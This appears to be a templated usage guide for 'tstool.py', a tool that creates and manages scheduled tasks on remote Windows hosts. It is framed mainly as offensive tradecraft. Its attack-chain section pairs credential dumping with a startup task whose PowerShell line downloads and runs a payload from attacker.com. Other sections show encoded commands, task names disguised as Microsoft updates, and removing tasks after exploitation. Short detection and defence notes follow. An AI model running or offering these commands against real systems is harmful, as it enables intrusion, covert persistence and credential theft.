## Command Line Options

```
usage: tstool.py [-h] [options] target

Required Arguments:
  target                [Description of target parameter]

Optional Arguments:
  -h, --help            Show help message
  [Add specific options based on tool functionality]

Authentication:
  -hashes               NTLM hashes (LM:NT)
  -no-pass              Don't ask for password
  -k                    Use Kerberos authentication
  -aesKey               AES key for Kerberos authentication
  -dc-ip                Domain controller IP address
```

## Usage Examples

### Basic Usage
```bash
# Basic command execution
python3 tstool.py [basic_parameters]

# With authentication
python3 tstool.py domain.com/user:password@target.domain.com

# Using hash authentication
python3 tstool.py -hashes :ntlmhash domain.com/user@target.domain.com
```

### Advanced Usage
```bash
# Create scheduled task with specific timing
python3 tstool.py -action create -name "SecurityUpdate" -command "cmd /c powershell.exe -enc <base64>" -trigger daily -time "02:00" domain.com/user:password@target

# List all scheduled tasks for reconnaissance
python3 tstool.py -action list domain.com/user:password@target

# Delete specific task after exploitation
python3 tstool.py -action delete -name "SecurityUpdate" domain.com/user:password@target
```

## Attack Chain Integration

### Persistence via Scheduled Tasks
```bash
# Step 1: Initial compromise and credential extraction
python3 secretsdump.py domain.com/user:password@target

# Step 2: Create persistent scheduled task
python3 tstool.py -action create -name "WindowsUpdate" -command "powershell.exe IEX(New-Object Net.WebClient).downloadString('http://attacker.com/payload')" -trigger startup domain.com/user:password@target

# Step 3: Verify task creation and execution
python3 tstool.py -action list domain.com/user:password@target
```

### Stealth Task Management
```bash
# Step 1: Enumerate existing scheduled tasks
python3 tstool.py -action list domain.com/user:password@target

# Step 2: Create task that mimics legitimate system task
python3 tstool.py -action create -name "MicrosoftEdgeUpdateTaskCore" -command "legitimate_looking_command" domain.com/user:password@target

## Prerequisites
- Administrative credentials on target system
- Network access to target on RPC/SMB ports (135, 445)
- Python 3.x with Impacket installed
- Windows target system with Task Scheduler service enabled

## Detection Considerations
- **Event IDs**: 
  - Event ID 4698/4699 (Scheduled task created/deleted)
  - Event ID 4700/4701 (Scheduled task enabled/disabled)
  - Event ID 106 (Task Scheduler task registered)
- **Network Indicators**: 
  - SMB/RPC connections to target system
  - Authentication traffic to Task Scheduler service
- **Process Indicators**: 
  - Task Scheduler service activity (svchost.exe)
  - Execution of scheduled task processes
- **File Indicators**: 
  - Task definition files in Windows\System32\Tasks
  - Executable files referenced by tasks
- **Registry Indicators**: 
  - Task Scheduler registry entries

## Defensive Measures
- Monitor scheduled task creation and modification events
- Enable Task Scheduler logging and auditing
- Implement application whitelisting for task executables
- Regular review of scheduled tasks for anomalies
- Network segmentation to limit task scheduler access
- Use Group Policy to control task creation permissions

## Common Issues and Troubleshooting

### Access Denied to Task Scheduler
```bash
# Problem: Insufficient privileges for task operations
# Solution: Verify account has administrative privileges
# Ensure account is in local Administrators group
python3 tstool.py -action list domain/admin:pass@target
```

### Task Creation Failures
```bash
# Problem: Task fails to create with specified parameters
# Solution: Verify task syntax and permissions
# Check if task name already exists
python3 tstool.py -action delete -name "existing_task" domain/user:pass@target
```
